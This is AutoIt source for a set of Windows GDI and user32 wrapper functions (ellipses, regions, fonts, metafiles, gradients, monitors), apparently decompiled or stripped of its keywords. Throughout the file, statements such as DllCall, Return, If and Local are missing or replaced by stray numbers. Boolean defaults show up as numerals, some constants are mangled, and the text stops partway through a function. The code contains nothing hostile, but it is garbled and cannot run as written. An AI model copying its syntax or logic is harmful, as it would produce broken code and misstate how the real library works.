$aret = ("gdi32.dll", "bool", "Ellipse", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4))
@error534(@error, @extended, 40)
$aret[0]

_winapi_endpaint($hwnd, 36$tpaintstruct)
$aret = ("user32.dll", "bool", "EndPaint", "hwnd", $hwnd, "struct*", $tpaintstruct)
@error534(@error, @extended, 40)
$aret[0]

_winapi_endpath($hdc)
$aret = ("gdi32.dll", "bool", "EndPath", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_enumdisplaymonitors($hdc = 0, $trect = 0)
$henumproc = ("__EnumDisplayMonitorsProc", "bool", "handle;handle;ptr;lparam")
$__g_venum[101][2] = [[0]]
$aret = ("user32.dll", "bool", "EnumDisplayMonitors", "handle", $hdc, "struct*", $trect, "ptr", ($henumproc), "lparam", 0)
@error23$aret[0]23$__g_venum[0][0]5
$__g_venum = @error + 10

($henumproc)
$__g_venum534($__g_venum, 0, 0)
__inc($__g_venum, -1)
$__g_venum

_winapi_enumdisplaysettings($sdevice, $imode)
$stypeofdevice = "wstr"
($sdevice, $str_stripleading + $str_striptrailing)5
$stypeofdevice = "ptr"
$sdevice = 0

$tdevmode = ($tagdevmode_display)
($tdevmode, "Size", ($tdevmode))
($tdevmode, "DriverExtra", 0)
$aret = ("user32.dll", "bool", "EnumDisplaySettingsW", $stypeofdevice, $sdevice, "dword", $imode, "struct*", $tdevmode)
@error23$aret[0]534(@error + 10, @extended, 0)
$aresult[5]
$aresult[0] = ($tdevmode, "PelsWidth")
$aresult[1] = ($tdevmode, "PelsHeight")
$aresult[2] = ($tdevmode, "BitsPerPel")
$aresult[3] = ($tdevmode, "DisplayFrequency")
$aresult[4] = ($tdevmode, "DisplayFlags")
$aresult

_winapi_enumfontfamilies($hdc = 0, $sfacename = "", $icharset = 1, $ifonttype = 7, $spattern = "", $bexclude = 40)
$tlogfont = ($taglogfont)
$tpattern = ("uint;uint;ptr;wchar[" & (($spattern) + 1) & "]")
($tpattern, 1, $ifonttype)
$spattern5
($tpattern, 2, 0)
($tpattern, 3, 0)

($tpattern, 2, $bexclude)
($tpattern, 3, ($tpattern, 4))
($tpattern, 4, $spattern)

($tlogfont, 9, $icharset)
($tlogfont, 13, 0)
($tlogfont, 14, ($sfacename, 31))
$hcdc
$hdc5
$hcdc = _winapi_createcompatibledc(0)

$hcdc = $hdc

$__g_venum[101][8] = [[0]]
$henumproc = ("__EnumFontFamiliesProc", "int", "ptr;ptr;dword;PTR")
$aret = ("gdi32.dll", "int", "EnumFontFamiliesExW", "handle", $hcdc, "struct*", $tlogfont, "ptr", ($henumproc), "PTR", ($tpattern), "dword", 0)
@error23$aret[0]23$__g_venum[0][0]5
$__g_venum = @error + 10

($henumproc)
$hdc5
_winapi_deletedc($hcdc)

$__g_venum534($__g_venum, 0, 0)
__inc($__g_venum, -1)
$__g_venum

_winapi_equalrect($trect1, $trect2)
$aret = ("user32.dll", "bool", "EqualRect", "struct*", $trect1, "struct*", $trect2)
@error534(@error, @extended, 40)
$aret[0]

_winapi_equalrgn($hrgn1, $hrgn2)
$aret = ("gdi32.dll", "bool", "EqualRgn", "handle", $hrgn1, "handle", $hrgn2)
@error534(@error, @extended, 40)
$aret[0]

_winapi_excludecliprect($hdc, $trect)
$aret = ("gdi32.dll", "int", "ExcludeClipRect", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4))
@error534(@error, @extended, 0)
$aret[0]

_winapi_extcreatepen($ipenstyle, $iwidth, $ibrushstyle, $irgb, $ihatch = 0, $auserstyle = 0, $istart = 0, $iend = -1)
$icount = 0, $tstyle = 0
($ipenstyle, 255) = 75
__checkerrorarraybounds($auserstyle, $istart, $iend)534(@error + 10, @extended, 0)
$tstyle = ("dword[" & ($iend - $istart + 1) & "]")
$i = $istart15$iend
($tstyle, 1, $auserstyle[$i], $icount + 1)
$icount += 1


$tlogbrush = ($taglogbrush)
($tlogbrush, 1, $ibrushstyle)
($tlogbrush, 2, __rgb($irgb))
($tlogbrush, 3, $ihatch)
$aret = ("gdi32.dll", "handle", "ExtCreatePen", "dword", $ipenstyle, "dword", $iwidth, "struct*", $tlogbrush, "dword", $icount, "struct*", $tstyle)
@error534(@error, @extended, 0)
$aret[0]

_winapi_extcreateregion($trgndata, $txform = 0)
$aret = ("gdi32.dll", "handle", "ExtCreateRegion", "struct*", $txform, "dword", ($trgndata), "struct*", $trgndata)
@error534(@error, @extended, 0)
$aret[0]

_winapi_extfloodfill($hdc, $ix, $iy, $irgb, $itype = 0)
$aret = ("gdi32.dll", "bool", "ExtFloodFill", "handle", $hdc, "int", $ix, "int", $iy, "dword", __rgb($irgb), "uint", $itype)
@error534(@error, @extended, 40)
$aret[0]

_winapi_extselectcliprgn($hdc, $hrgn, $imode = 5)
$aret = ("gdi32.dll", "int", "ExtSelectClipRgn", "handle", $hdc, "handle", $hrgn, "int", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_fillpath($hdc)
$aret = ("gdi32.dll", "bool", "FillPath", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_fillrgn($hdc, $hrgn, $hbrush)
$aret = ("gdi32.dll", "bool", "FillRgn", "handle", $hdc, "handle", $hrgn, "handle", $hbrush)
@error534(@error, @extended, 40)
$aret[0]

_winapi_flattenpath($hdc)
$aret = ("gdi32.dll", "bool", "FlattenPath", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_framergn($hdc, $hrgn, $hbrush, $iwidth, $iheight)
$aret = ("gdi32.dll", "bool", "FrameRgn", "handle", $hdc, "handle", $hrgn, "handle", $hbrush, "int", $iwidth, "int", $iheight)
@error534(@error, @extended, 40)
$aret[0]

_winapi_gdicomment($hdc, $pbuffer, $isize)
$aret = ("gdi32.dll", "bool", "GdiComment", "handle", $hdc, "uint", $isize, "ptr", $pbuffer)
@error534(@error, @extended, 40)
$aret[0]

_winapi_getarcdirection($hdc)
$aret = ("gdi32.dll", "int", "GetArcDirection", "handle", $hdc)
@error534(@error, @extended, 0)
($aret[0] < 1)($aret[0] > 2)534(10, $aret[0], 0)
$aret[0]

_winapi_getbitmapbits($hbitmap, $isize, $pbits)
$aret = ("gdi32.dll", "long", "GetBitmapBits", "ptr", $hbitmap, "long", $isize, "ptr", $pbits)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getbitmapdimensionex($hbitmap)
$tsize = ($tagsize)
$aret = ("gdi32.dll", "bool", "GetBitmapDimensionEx", "handle", $hbitmap, "struct*", $tsize)
@error23$aret[0]534(@error + 10, @extended, 0)
$tsize

_winapi_getbkcolor($hdc)
$aret = ("gdi32.dll", "dword", "GetBkColor", "handle", $hdc)
@error($aret[0] = -1)534(@error, @extended, -1)
__rgb($aret[0])

_winapi_getboundsrect($hdc, $iflags = 0)
$trect = ($tagrect)
$aret = ("gdi32.dll", "uint", "GetBoundsRect", "handle", $hdc, "struct*", $trect, "uint", $iflags)
@error23$aret[0]534(@error + 10, @extended, 0)
($aret[0], $trect)

_winapi_getbrushorg($hdc)
$tpoint = ($tagpoint)
$aret = ("gdi32.dll", "bool", "GetBrushOrgEx", "handle", $hdc, "struct*", $tpoint)
@error23$aret[0]534(@error + 10, @extended, 0)
$tpoint

_winapi_getbvalue($irgb)
((__rgb($irgb), 16711680), 16)

_winapi_getclipbox($hdc, 36$trect)
$trect = ($tagrect)
$aret = ("gdi32.dll", "int", "GetClipBox", "handle", $hdc, "struct*", $trect)
@error23$aret[0]5
$trect = 0
(@error, @extended, 0)

$aret[0]

_winapi_getcliprgn($hdc)
$hrgn = _winapi_createrectrgn(0, 0, 0, 0)
$ierror = 0
$aret = ("gdi32.dll", "int", "GetClipRgn", "handle", $hdc, "handle", $hrgn)
@error($aret[0] = -1)5$ierror = @error + 10
$ierror23$aret[0]5
_winapi_deleteobject($hrgn)
$hrgn = 0

($ierror, 0, $hrgn)

_winapi_getcoloradjustment($hdc)
$tadjustment = ($tagcoloradjustment)
$aret = ("gdi32.dll", "bool", "GetColorAdjustment", "handle", $hdc, "struct*", $tadjustment)
@error23$aret[0]534(@error + 10, @extended, 0)
$tadjustment

_winapi_getcurrentobject($hdc, $itype)
$aret = ("gdi32.dll", "handle", "GetCurrentObject", "handle", $hdc, "uint", $itype)
@error23$aret[0]534(@error, @extended, 0)
$aret[0]

_winapi_getcurrentposition($hdc)
$tpoint = ($tagpoint)
$aret = ("gdi32.dll", "int", "GetCurrentPositionEx", "handle", $hdc, "struct*", $tpoint)
@error23$aret[0]534(@error + 10, @extended, 0)
$tpoint

_winapi_getdcex($hwnd, $hrgn, $iflags)
$aret = ("user32.dll", "handle", "GetDCEx", "hwnd", $hwnd, "handle", $hrgn, "dword", $iflags)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getdevicegammaramp($hdc, 36$aramp)
$aramp = 0
$tdata = ("word[256];word[256];word[256]")
$aret = ("gdi32.dll", "bool", "GetDeviceGammaRamp", "handle", $hdc, "struct*", $tdata)
@error23$aret[0]534(@error, @extended, 0)
$aramp[256][3]
$i = 0152
$j = 015255
$aramp[$j][$i] = ($tdata, $i + 1, $j + 1)




_winapi_getdibcolortable($hbitmap)
$hdc = _winapi_createcompatibledc(0)
$hsv = _winapi_selectobject($hdc, $hbitmap)
$tpeak = ("dword[256]")
$ierror = 0
$aret = ("gdi32.dll", "uint", "GetDIBColorTable", "handle", $hdc, "uint", 0, "uint", 256, "struct*", $tpeak)
@error23$aret[0]5$ierror = @error + 10
_winapi_selectobject($hdc, $hsv)
_winapi_deletedc($hdc)
$ierror534($ierror, 0, 0)
$tdata = ("dword[" & $aret[0] & "]")
@error534(@error + 20, @extended, 0)
_winapi_movememory(($tdata), $aret[4], 4 * $aret[0])
($aret[0], $tdata)

_winapi_getenhmetafile($sfile)
$aret = ("gdi32.dll", "handle", "GetEnhMetaFileW", "wstr", $sfile)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getenhmetafilebits($hemf, 36$pbuffer)
$aret = ("gdi32.dll", "uint", "GetEnhMetaFileBits", "handle", $hemf, "uint", 0, "ptr", 0)
@error23$aret[0]534(@error + 50, @extended, 0)
$pbuffer = __heaprealloc($pbuffer, $aret[0], 1)
@error534(@error, @extended, 0)
$aret = ("gdi32.dll", "uint", "GetEnhMetaFileBits", "handle", $hemf, "uint", $aret[0], "ptr", $pbuffer)
$aret[0]534(60, 0, 0)
$aret[2]

_winapi_getenhmetafiledescription($hemf)
$tdata = ("wchar[4096]")
$aret = ("gdi32.dll", "uint", "GetEnhMetaFileDescriptionW", "handle", $hemf, "uint", 4096, "struct*", $tdata)
@error($aret[0] = 4294967295)534(@error + 20, $aret[0], 0)
$aret[0]5340
$adata = _winapi_structtoarray($tdata)
@error534(@error, @extended, 0)
$aresult[2]
$i = 0151
$adata[0] > $i5
$aresult[$i] = $adata[$i + 1]

$aresult[$i] = ""


$aresult

_winapi_getenhmetafiledimension($hemf)
$tenhmetaheader = _winapi_getenhmetafileheader($hemf)
@error534(@error, @extended, 0)
$tsize = ($tagsize)
($tsize, 1, ((($tenhmetaheader, "rcFrame", 3) - ($tenhmetaheader, "rcFrame", 1)) * ($tenhmetaheader, "Device", 1) / ($tenhmetaheader, "Millimeters", 1) / 100))
($tsize, 2, ((($tenhmetaheader, "rcFrame", 4) - ($tenhmetaheader, "rcFrame", 2)) * ($tenhmetaheader, "Device", 2) / ($tenhmetaheader, "Millimeters", 2) / 100))
$tsize

_winapi_getenhmetafileheader($hemf)
$tenhmetaheader = ($tagenhmetaheader)
$aret = ("gdi32.dll", "uint", "GetEnhMetaFileHeader", "handle", $hemf, "uint", ($tenhmetaheader), "struct*", $tenhmetaheader)
@error23$aret[0]534(@error + 10, @extended, 0)
($aret[0], $tenhmetaheader)

_winapi_getfontname($sfacename, $istyle = 0, $icharset = 1)
$sfacename534(1, 0, "")
$iflags = 0
($istyle, 1)5
$iflags += 32

($istyle, 2)5
$iflags += 1

$iflags5
$iflags = 64

$tlogfont = ($taglogfont)
($tlogfont, 9, $icharset)
($tlogfont, 13, 0)
($tlogfont, 14, ($sfacename, 31))
$tfn = ("dword;wchar[64]")
($tfn, 1, $iflags)
($tfn, 2, "")
$hdc = _winapi_createcompatibledc(0)
$henumproc = ("__EnumFontStylesProc", "int", "ptr;ptr;dword;lparam")
$sret = ""
$aret = ("gdi32.dll", "int", "EnumFontFamiliesExW", "handle", $hdc, "struct*", $tlogfont, "ptr", ($henumproc), "struct*", $tfn, "dword", 0)
@error13$aret[0]5$sret = ($tfn, 2)
($henumproc)
_winapi_deletedc($hdc)
$sret534(2, 0, "")
$sret

_winapi_getfontresourceinfo($sfont, $bforce = 40)
$bforce5
_winapi_addfontresourceex($sfont, 32)534(@error + 20, @extended, "")

$ierror = 0
$aret = ("gdi32.dll", "bool", "GetFontResourceInfoW", "wstr", $sfont, "dword*", 4096, "wstr", "", "dword", 1)
@error23$aret[0]5$ierror = @error + 10
$bforce5
_winapi_removefontresourceex($sfont, 32)

$ierror534($ierror, 0, "")
$aret[3]

_winapi_getglyphoutline($hdc, $schar, $iformat, 36$pbuffer, $tmat2 = 0)
$tgm = ($tagglyphmetrics)
$aret, $ilength = 0
($tmat2)5
$tmat2 = ("short[8]")
($tmat2, 1, 1, 2)
($tmat2, 1, 1, 8)

$iformat5
$aret = ("gdi32.dll", "dword", "GetGlyphOutlineW", "handle", $hdc, "uint", ($schar), "uint", $iformat, "struct*", $tgm, "dword", 0, "ptr", 0, "struct*", $tmat2)
@error($aret[0] = 4294967295)534(@error + 10, @extended, 0)
$ilength = $aret[0]
$pbuffer = __heaprealloc($pbuffer, $ilength, 1)
@error534(@error + 20, @extended, 0)

$aret = ("gdi32.dll", "dword", "GetGlyphOutlineW", "handle", $hdc, "uint", ($schar), "uint", $iformat, "struct*", $tgm, "dword", $ilength, "ptr", $pbuffer, "struct*", $tmat2)
@error534(@error, @extended, 0)
$aret[0] = 4294967295534(10, -1, 0)
($ilength, $tgm)

_winapi_getgraphicsmode($hdc)
$aret = ("gdi32.dll", "int", "GetGraphicsMode", "handle", $hdc)
@error23$aret[0]534(@error, @extended, 0)
$aret[0]

_winapi_getgvalue($irgb)
((__rgb($irgb), 65280), 8)

_winapi_geticondimension($hicon)
$ticoninfo = ($tagiconinfo)
$aret = ("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
@error23$aret[0]534(@error + 10, @extended, 0)
$tsize = _winapi_getbitmapdimension(($ticoninfo, 5))
$i = 4155
_winapi_deleteobject(($ticoninfo, $i))

($tsize)534(20, 0, 0)
$tsize

_winapi_getmapmode($hdc)
$aret = ("gdi32.dll", "int", "GetMapMode", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getobjecttype($hobject)
$aret = ("gdi32.dll", "dword", "GetObjectType", "handle", $hobject)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getoutlinetextmetrics($hdc)
$aret = ("gdi32.dll", "uint", "GetOutlineTextMetricsW", "handle", $hdc, "uint", 0, "ptr", 0)
@error23$aret[0]534(@error + 10, @extended, 0)
$tdata = ("byte[" & $aret[0] & "]")
$toltm = ($tagoutlinetextmetric, ($tdata))
$aret = ("gdi32.dll", "uint", "GetOutlineTextMetricsW", "handle", $hdc, "uint", $aret[0], "struct*", $tdata)
$aret[0]534(20, 0, 0)
$toltm

_winapi_getpixel($hdc, $ix, $iy)
$aret = ("gdi32.dll", "dword", "GetPixel", "handle", $hdc, "int", $ix, "int", $iy)
@error($aret[0] = 4294967295)534(@error, @extended, -1)
__rgb($aret[0])

_winapi_getpolyfillmode($hdc)
$aret = ("gdi32.dll", "int", "GetPolyFillMode", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getposfromrect($trect)
$aresult[4]
$i = 0153
$aresult[$i] = ($trect, $i + 1)
@error534(@error, @extended, 0)

$i = 2153
$aresult[$i] -= $aresult[$i - 2]

$aresult

_winapi_getregiondata($hrgn, 36$trgndata)
$aret = ("gdi32.dll", "dword", "GetRegionData", "handle", $hrgn, "dword", 0, "ptr", 0)
@error23$aret[0]5
$trgndata = 0
(@error, @extended, 40)

$trgndata = ($tagrgndataheader)
$irectsize = $aret[0] - ($trgndata)
$irectsize > 05$trgndata = ($tagrgndataheader & ";byte[" & $irectsize & "]")
$aret = ("gdi32.dll", "dword", "GetRegionData", "handle", $hrgn, "dword", $aret[0], "struct*", $trgndata)
$aret[0]5$trgndata = 0
$aret[0]

_winapi_getrgnbox($hrgn, 36$trect)
$trect = ($tagrect)
$aret = ("gdi32.dll", "int", "GetRgnBox", "handle", $hrgn, "struct*", $trect)
@error23$aret[0]5
$trect = 0
(@error, @extended, 0)

$aret[0]

_winapi_getrop($hdc)
$aret = ("gdi32.dll", "int", "GetROP2", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getrvalue($irgb)
(__rgb($irgb), 255)

_winapi_getstretchbltmode($hdc)
$aret = ("gdi32.dll", "int", "GetStretchBltMode", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_gettabbedtextextent($hdc, $stext, $atab = 0, $istart = 0, $iend = -1)
$itab, $icount
($atab)5
$atab5
$itab = $atab
$atab[1] = [$itab]
$istart = 0
$iend = 0
$icount = 1

$icount = 0


$icount = 1

$icount5
__checkerrorarraybounds($atab, $istart, $iend)534(@error + 10, @extended, 0)
$icount = $iend - $istart + 1
$ttab = ("uint[" & $icount & "]")
$itab = 1
$i = $istart15$iend
($ttab, 1, $atab[$i], $itab)
$itab += 1


$aret = ("user32.dll", "dword", "GetTabbedTextExtentW", "handle", $hdc, "wstr", $stext, "int", ($stext), "int", $icount, "ptr", ($ttab))
@error23$aret[0]534(@error + 20, @extended, 0)
_winapi_createsize(_winapi_loword($aret[0]), _winapi_hiword($aret[0]))

_winapi_gettextalign($hdc)
$aret = ("gdi32.dll", "uint", "GetTextAlign", "handle", $hdc)
@error($aret[0] = 4294967295)534(@error, @extended, -1)
$aret[0]

_winapi_gettextcharacterextra($hdc)
$aret = ("gdi32.dll", "int", "GetTextCharacterExtra", "handle", $hdc)
@error($aret[0] = 134217728)534(@error, @extended, -1)
$aret[0]

_winapi_gettextcolor($hdc)
$aret = ("gdi32.dll", "dword", "GetTextColor", "handle", $hdc)
@error($aret[0] = 4294967295)534(@error, @extended, -1)
__rgb($aret[0])

_winapi_gettextface($hdc)
$aret = ("gdi32.dll", "int", "GetTextFaceW", "handle", $hdc, "int", 2048, "wstr", "")
@error23$aret[0]534(@error + 10, @extended, "")
$aret[3]

_winapi_getudfcolormode()
($__g_irgbmode)

_winapi_getupdaterect($hwnd, $berase = 39)
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "GetUpdateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
@error23$aret[0]534(@error + 10, @extended, 0)
$trect

_winapi_getupdatergn($hwnd, $hrgn, $berase = 39)
$aret = ("user32.dll", "int", "GetUpdateRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $berase)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getwindowext($hdc)
$tsize = ($tagsize)
$aret = ("gdi32.dll", "bool", "GetWindowExtEx", "handle", $hdc, "struct*", $tsize)
@error23$aret[0]534(@error + 10, @extended, 0)
$tsize

_winapi_getwindoworg($hdc)
$tpoint = ($tagpoint)
$aret = ("gdi32.dll", "bool", "GetWindowOrgEx", "handle", $hdc, "struct*", $tpoint)
@error23$aret[0]534(@error + 10, @extended, 0)
$tpoint

_winapi_getwindowrgnbox($hwnd, 36$trect)
$trect = ($tagrect)
$aret = ("gdi32.dll", "int", "GetWindowRgnBox", "hwnd", $hwnd, "struct*", $trect)
@error534(@error, @extended, 0)
$aret[0]

_winapi_getworldtransform($hdc)
$txform = ($tagxform)
$aret = ("gdi32.dll", "bool", "GetWorldTransform", "handle", $hdc, "struct*", $txform)
@error23$aret[0]534(@error + 10, @extended, 0)
$txform

_winapi_gradientfill($hdc, 3036$avertex, $istart = 0, $iend = -1, $brotate = 40)
__checkerrorarraybounds($avertex, $istart, $iend, 2)534(@error + 10, @extended, 0)
($avertex, $ubound_columns) < 3534(13, 0, 0)
$ipoint = $iend - $istart + 1
$ipoint > 35
$iend = $istart + 2
$ipoint = 3

$imode
$ipoint

$imode = (3$brotate)

$imode = 2

(15, 0, 0)

$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "ushort[8];"

$tvertex = ($tagstruct)
$icount = 1
$tgradient = ("ulong[" & $ipoint & "]")
$i = $istart15$iend
($tgradient, 1, $icount - 1, $icount)
($tvertex, $icount, _winapi_loword($avertex[$i][0]), 1)
($tvertex, $icount, _winapi_hiword($avertex[$i][0]), 2)
($tvertex, $icount, _winapi_loword($avertex[$i][1]), 3)
($tvertex, $icount, _winapi_hiword($avertex[$i][1]), 4)
($tvertex, $icount, (_winapi_getrvalue($avertex[$i][2]), -8), 5)
($tvertex, $icount, (_winapi_getgvalue($avertex[$i][2]), -8), 6)
($tvertex, $icount, (_winapi_getbvalue($avertex[$i][2]), -8), 7)
($tvertex, $icount, 0, 8)
$icount += 1

$aret = ("gdi32.dll", "bool", "GdiGradientFill", "handle", $hdc, "struct*", $tvertex, "ulong", $ipoint, "struct*", $tgradient, "ulong", 1, "ulong", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_inflaterect(36$trect, $idx, $idy)
$aret = ("user32.dll", "bool", "InflateRect", "struct*", $trect, "int", $idx, "int", $idy)
@error534(@error, @extended, 40)
$aret[0]

_winapi_intersectcliprect($hdc, $trect)
$aret = ("gdi32.dll", "int", "IntersectClipRect", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4))
@error534(@error, @extended, 0)
$aret[0]

_winapi_intersectrect($trect1, $trect2)
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "IntersectRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
@error23$aret[0]534(@error + 10, @extended, 0)
$trect

_winapi_invalidatergn($hwnd, $hrgn = 0, $berase = 39)
$aret = ("user32.dll", "bool", "InvalidateRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $berase)
@error534(@error, @extended, 40)
$aret[0]

_winapi_invertandbitmap($hbitmap, $bdelete = 40)
$tbitmap = ($tagbitmap)
_winapi_getobject($hbitmap, ($tbitmap), ($tbitmap))(($tbitmap, "bmBitsPixel") <> 1)5
(@error + 10, @extended, 0)

$hresult = _winapi_createdib(($tbitmap, "bmWidth"), ($tbitmap, "bmHeight"), 1)
$hresult534(@error, @extended, 0)
$hsrcdc = _winapi_createcompatibledc(0)
$hsrcsv = _winapi_selectobject($hsrcdc, $hbitmap)
$hdstdc = _winapi_createcompatibledc(0)
$hdstsv = _winapi_selectobject($hdstdc, $hresult)
_winapi_bitblt($hdstdc, 0, 0, ($tbitmap, "bmWidth"), ($tbitmap, "bmHeight"), $hsrcdc, 0, 0, 3342344)
_winapi_selectobject($hsrcdc, $hsrcsv)
_winapi_deletedc($hsrcdc)
_winapi_selectobject($hdstdc, $hdstsv)
_winapi_deletedc($hdstdc)
$bdelete5
_winapi_deleteobject($hbitmap)

$hresult

_winapi_invertcolor($icolor)
$icolor = -15340
6777215 - ($icolor, 16777215)

_winapi_invertrect($hdc, 36$trect)
$aret = ("user32.dll", "bool", "InvertRect", "handle", $hdc, "struct*", $trect)
@error534(@error, @extended, 40)
$aret[0]

_winapi_invertrgn($hdc, $hrgn)
$aret = ("gdi32.dll", "bool", "InvertRgn", "handle", $hdc, "handle", $hrgn)
@error534(@error, @extended, 40)
$aret[0]

_winapi_isalphabitmap($hbitmap)
$hbitmap = _winapi_copybitmap($hbitmap)
$hbitmap534(@error + 20, @extended, 0)
$aret, $ierror = 0

$tdib = ($tagdibsection)
(3_winapi_getobject($hbitmap, ($tdib), ($tdib)))(($tdib, "bmBitsPixel") <> 32)(($tdib, "biCompression"))5
$ierror = 1


$aret = ("user32.dll", "int", "CallWindowProc", "ptr", __alphaproc(), "ptr", 0, "uint", 0, "struct*", $tdib, "ptr", 0)
@error($aret[0] = -1)5
$ierror = @error + 10



_winapi_deleteobject($hbitmap)
$ierror534($ierror, 0, 0)
$aret[0]

_winapi_isrectempty(36$trect)
$aret = ("user32.dll", "bool", "IsRectEmpty", "struct*", $trect)
@error534(@error, @extended, 40)
$aret[0]

_winapi_linedda($ix1, $iy1, $ix2, $iy2, $plineproc, $pdata = 0)
$aret = ("gdi32.dll", "bool", "LineDDA", "int", $ix1, "int", $iy1, "int", $ix2, "int", $iy2, "ptr", $plineproc, "lparam", $pdata)
@error534(@error, @extended, 40)
$aret[0]

_winapi_lockwindowupdate($hwnd)
$aret = ("user32.dll", "bool", "LockWindowUpdate", "hwnd", $hwnd)
@error534(@error, @extended, 40)
$aret[0]

_winapi_lptodp($hdc, 36$tpoint, $icount = 1)
$aret = ("gdi32.dll", "bool", "LPtoDP", "handle", $hdc, "struct*", $tpoint, "int", $icount)
@error534(@error, @extended, 40)
$aret[0]

_winapi_maskblt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $hmask, $ixmask, $iymask, $irop)
$aret = ("gdi32.dll", "bool", "MaskBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "handle", $hmask, "int", $ixmask, "int", $iymask, "dword", $irop)
@error534(@error, @extended, 40)
$aret[0]

_winapi_modifyworldtransform($hdc, 36$txform, $imode)
$aret = ("gdi32.dll", "bool", "ModifyWorldTransform", "handle", $hdc, "struct*", $txform, "dword", $imode)
@error534(@error, @extended, 40)
$aret[0]

_winapi_monitorfrompoint(36$tpoint, $iflag = 1)
($tpoint) <> 8534(@error + 10, @extended, 0)
$aret = ("user32.dll", "handle", "MonitorFromPoint", "struct", $tpoint, "dword", $iflag)
@error534(@error, @extended, 0)
$aret[0]

_winapi_monitorfromrect(36$trect, $iflag = 1)
$aret = ("user32.dll", "ptr", "MonitorFromRect", "struct*", $trect, "dword", $iflag)
@error534(@error, @extended, 0)
$aret[0]

_winapi_monitorfromwindow($hwnd, $iflag = 1)
$aret = ("user32.dll", "handle", "MonitorFromWindow", "hwnd", $hwnd, "dword", $iflag)
@error534(@error, @extended, 0)
$aret[0]

_winapi_movetoex($hdc, $ix, $iy)
$tpoint = ($tagpoint)
$aret = ("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $tpoint)
@error23$aret[0]534(@error + 10, @extended, 0)
$tpoint

_winapi_offsetcliprgn($hdc, $ixoffset, $iyoffset)
$aret = ("gdi32.dll", "int", "OffsetClipRgn", "handle", $hdc, "int", $ixoffset, "int", $iyoffset)
@error534(@error, @extended, 0)
$aret[0]

_winapi_offsetpoints(36$apoint, $ixoffset, $iyoffset, $istart = 0, $iend = -1)
__checkerrorarraybounds($apoint, $istart, $iend, 2)534(@error + 10, @extended, 0)
($apoint, $ubound_columns) < 2534(13, 0, 0)
$i = $istart15$iend
$apoint[$i][0] += $ixoffset
$apoint[$i][1] += $iyoffset



_winapi_offsetrect(36$trect, $idx, $idy)
$aret = ("user32.dll", "bool", "OffsetRect", "struct*", $trect, "int", $idx, "int", $idy)
@error534(@error, @extended, 0)
$aret[0]

_winapi_offsetrgn($hrgn, $ixoffset, $iyoffset)
$aret = ("gdi32.dll", "int", "OffsetRgn", "handle", $hrgn, "int", $ixoffset, "int", $iyoffset)
@error534(@error, @extended, 0)
$aret[0]

_winapi_offsetwindoworg($hdc, $ixoffset, $iyoffset)
$__g_vext = ($tagpoint)
$aret = ("gdi32.dll", "bool", "OffsetWindowOrgEx", "handle", $hdc, "int", $ixoffset, "int", $iyoffset, "struct*", $__g_vext)
@error534(@error, @extended, 40)
$aret[0]

_winapi_paintdesktop($hdc)
$aret = ("user32.dll", "bool", "PaintDesktop", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_paintrgn($hdc, $hrgn)
$aret = ("gdi32.dll", "bool", "PaintRgn", "handle", $hdc, "handle", $hrgn)
@error534(@error, @extended, 40)
$aret[0]

_winapi_patblt($hdc, $ix, $iy, $iwidth, $iheight, $irop)
$aret = ("gdi32.dll", "bool", "PatBlt", "handle", $hdc, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "dword", $irop)
@error534(@error, @extended, 40)
$aret[0]

_winapi_pathtoregion($hdc)
$aret = ("gdi32.dll", "handle", "PathToRegion", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_playenhmetafile($hdc, $hemf, 36$trect)
$aret = ("gdi32.dll", "bool", "PlayEnhMetaFile", "handle", $hdc, "handle", $hemf, "struct*", $trect)
@error534(@error, @extended, 40)
$aret[0]

_winapi_plgblt($hdestdc, 3036$apoint, $hsrcdc, $ixsrc, $iysrc, $iwidth, $iheight, $hmask = 0, $ixmask = 0, $iymask = 0)
(($apoint) < 3)(($apoint, $ubound_columns) < 2)534(12, 0, 40)
$tpoints = ("long[2];long[2];long[2]")
$i = 0152
$j = 0151
($tpoints, $i + 1, $apoint[$i][$j], $j + 1)


$aret = ("gdi32.dll", "bool", "PlgBlt", "handle", $hdestdc, "struct*", $tpoints, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidth, "int", $iheight, "ptr", $hmask, "int", $ixmask, "int", $iymask)
@error534(@error, @extended, 40)
$aret[0]

_winapi_polybezier($hdc, 3036$apoint, $istart = 0, $iend = -1)
__checkerrorarraybounds($apoint, $istart, $iend, 2, 2)534(@error + 10, @extended, 40)
$ipoint = 1 + 3 * (($iend - $istart) / 3)
